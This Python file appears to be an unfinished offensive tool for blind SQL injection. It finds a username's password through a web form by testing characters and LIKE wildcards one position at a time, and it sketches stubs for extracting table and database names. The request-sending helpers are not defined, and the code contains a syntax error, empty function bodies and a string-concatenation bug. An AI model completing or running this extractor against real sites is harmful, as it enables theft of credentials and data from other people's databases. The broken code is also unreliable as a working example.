

# https://stackoverflow.com/questions/54621596/include-both-single-quote-and-double-quote-in-python-string-variable
# https://stackoverflow.com/questions/54620287/how-to-include-both-single-and-double-quotes-in-the-same-string-variable-in-pyth
# special = {|}~[\]^_`!"#$%&'()*+,-./:;<=>?@)
# so use .join or """ i guess?
# special = ''.join("{|}~[\]^`!#$&'()*+,-./:;<=>?@)") + '"'
special = (" ".join("{|}~[\]^`!#$&'()*+,-./:;<=>?@)") + '"').split()
lower = " ".join("abcdefghijklmnopqrstuvwxyz").split()
upper = " ".join("ABCDEFGHIJKLMNOPQRSTUVWXYZ").split()
numbers = " ".join("0123456789").split()

# lower = [ "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z" ]
# upper = [ "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" ]
# numbers = [ "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" ]
# special = [ "{", "|", "}", "~", "[", "\", "]", "^", "`", "!", '#', '$', '&', "'", " ", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";", "<", "=", ">", "?", "@", ")", """, ")", "+", '"' ]

# https://stackoverflow.com/questions/28056843/special-characters-in-string-literals#28056873
other = []
wildcards = ["_", "%"]


def assignCharacters(otherChars, where):
   """makes variables for subsets of the unicode char sets
   
   Args:
      otherChars: string or list
         additional characters to concatenate with the variable where
      where: variable -- string or list
         which variable to concatenate with otherChars
   
   Returns: 
      where:
         where concatenated with otherChars
   
   """
   if(isinstance(otherChars, list)):
       where.append(otherChars)
   if(isinstance(otherChars, str)):
       tmp = " ".join(otherChars).split()
       where.append(tmp)


       
#   return where
   
# Type checking:   
# https://stackoverflow.com/questions/1835018/how-to-check-if-an-object-is-a-list-or-tuple-but-not-string#1835044
# https://stackoverflow.com/questions/26544091/checking-if-type-list-in-python

# Global Variables:
# https://stackoverflow.com/questions/423379/using-global-variables-in-a-function
# Unbound Local Error:
# https://stackoverflow.com/questions/9264763/dont-understand-why-unboundlocalerror-occurs
# Variable Scope:
# https://stackoverflow.com/questions/370357/python-variable-scope-error



def makeList(username, url, caseSensitive = False, wildCards = True):
   """checks for common characters in the password and returns the characters contained somewhere in the password string

   characters: a-z 0-9 "{|}~[\]^_`!#$%&'()*+,-./:;<=>?@)
      if caseSensitive = True: A-Z
   
   Args:
      username: string
         valid username to check password
      url: string
         url to form to check
      caseSensitive: boolean (optional)
         Set to true to check uppercase and lowercase versions of the characters
      wildCards: boolean (optional)
         default true
         Set to false to disallow wildcards -- not currently recommended, may cause unexpected code failures

   Returns:
      charList:
         list of the characters in the password. 
         
         Note: also returned _ and %. Took those characters out of the character set for now. Add em back later:
         https://stackoverflow.com/questions/8764370/escaping-special-characters-in-sql
         https://www.techonthenet.com/sql/like.php

   """
   charList = []
   for ch in lower:
      # check for ch in 
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   for ch in numbers:
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   for ch in special:
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   for ch in other:
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   if(caseSensitive):
      for ch in upper:
         if(checkPasswordCharacter(str(ch), username, url)):
            charList.append(str(ch))
            print(ch)
   if(wildCards):
      for ch in wildcards:
         if(checkPasswordCharacter(str(ch), username, url)):
            charList.append(str(ch))
            print(ch)
   return charList



def checkPass(username, url, charList, n):
   """checks for a character in position i, and records it when the character at postion i was found.
      
      Args:
         username:

         url:

         charList: list of valid characters from the password

         n: integer
            max size of passwords to check. will stop checking and return current progress if n < len(password)

      Returns:
         i: integer
            prints i iff there is no character in charList that matches at position i. also raises type and value error after printing i -- printing is handled by findChar
         password: string
            correct password or, if len(password) = n, first n characters of password
            if no characters match and wildcards are in the charList (wildCards is True), _ will be substituted in since it matches every single character.
            otherwise, if no characters match, that character will be skipped, and it's index is printed (e.g. Missing: 6) 

      Raises:
         TypeError: exception
            raised with ValueErrors when findChar returns i instead of an element of CharList
         ValueError: exception 
            raised when no character in charList is correct.

   https://stackoverflow.com/questions/2052390/manually-raising-throwing-an-exception-in-python
   
   Note: not working as hoped. Perhaps I need to change the other functions to always return a str? Maybe a place holder string like _ for now? 

   """
   # dikt = {}
   password = ""
   for i in range(0, n):
      if(testPassword(password, username, url)):
         return password #password is found!       
       # https://stackoverflow.com/questions/189645/how-to-break-out-of-multiple-loops-in-python
      ch = findChar(username, url, charList, i)
      # if(isinstance(ch, int))#if ch is int i, can't find a matching character at index i in password string 
      # use try except instead of if(isinstance(ch, int)):
      # https://stackoverflow.com/questions/3501382/checking-whether-a-variable-is-an-integer-or-not
      try: 
         password += ch
      except TypeError:
         # print(i)
         password += str(ch) #should be blank
         # raise ValueError("index i has no matching character")
   return password #only reached if password is too long for the given n


def findChar(username, url, charList, i):
   """helper function for checkPass
   returns the first element of charList found that works for the password at index i
   if it fails to find a character at i, prints i and returns an empty string instead of returning i.
   """
   for ch in charList:
         if(checkPasswordCharacter(ch, username, url, index = i)):
            return ch
   #only runs if no ch in charList match:
   # return i #oof, there's no match if i is out of bounds, e.g. len(password) < i
   print("Missing: " + i) #so I know when it's not a match
   return "" #return an empty string instead
   # Note to self: should not return an _ because it'll match an _ if wildCards are true (default). 
   # If wildCards is false, this will just skip characters that don't match anything!

"""
   Strategy:
   
   if findChar returns i -  meaning checkPass will print i then raise a type and a value error -
   then perhaps check all unicode characters for the password at index i and add the one that works to the charaters checked and rerun the script
   
"""

def makeTableList(url, caseSensitive = False, wildCards = True):
   """ List of characters in table names
   
   Args:
      url: String
         form url
      caseSensitive: Boolean
         default False
         true if case sentitivity matters
      wildCards: Boolean
         default True
         true if wildcards should be placed where no other characters match

   Returns:
      lst: List
         list of characters in table names

   """

def makeDatabaseList():
   """ List of characters in database names

   Args:
      url: String
         form url
      caseSensitive: Boolean
         default False
         true if case sentitivity matters
      wildCards: Boolean
         default True
         true if wildcards should be placed where no other characters match

   Returns:
      lst: List
         list of characters in table names

"""

def make makeTableNamesList(n, ):
   """ List of table names
   
   Args:
      n: integer
         max number of table names to return
      

   Returns:
      lst: list
         list of up to n table names
   """

def makeDatabaseNamesList(n, ):
   """ List of database names
   
   Args:
      n: integer
         max number of table names to return
      

   Returns:
      lst: list
         list of up to n database names

"""

"""
is sql case sensitive?

it can be:
https://stackoverflow.com/questions/3969059/sql-case-sensitive-string-compare

some commands to check and alter collation:
https://stackoverflow.com/questions/14962419/is-the-like-operator-case-sensitive-with-mssql-server
https://stackoverflow.com/questions/1411161/sql-server-check-case-sensitivity
https://stackoverflow.com/questions/1831105/how-to-do-a-case-sensitive-search-in-where-clause-im-using-sql-server

"""